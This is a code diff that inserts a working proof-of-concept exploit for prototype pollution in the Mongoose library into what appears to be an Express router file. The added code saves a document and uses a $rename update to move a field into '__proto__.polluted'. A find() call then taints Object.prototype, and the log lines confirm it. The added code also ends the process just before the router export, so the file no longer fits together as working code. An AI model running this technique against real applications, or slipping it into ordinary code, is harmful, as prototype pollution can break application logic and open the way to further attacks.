@@ -36,4 +36,26 @@ for(const page of pages) {
     });
 }
 
+import { connect, model, Schema } from 'mongoose';
+
+await connect('mongodb://127.0.0.1:27017/exploit');
+
+const Example = model('Example', new Schema({ hello: String }));
+
+const example = await new Example({ hello: 'world!' }).save();
+await Example.findByIdAndUpdate(example._id, {
+    $rename: {
+        hello: '__proto__.polluted'
+    }
+});
+
+// this is what causes the pollution
+await Example.find();
+
+const test = {};
+console.log(test.polluted); // world!
+console.log(Object.prototype); // [Object: null prototype] { polluted: 'world!' }
+
+process.exit();
+
 module.exports = router;
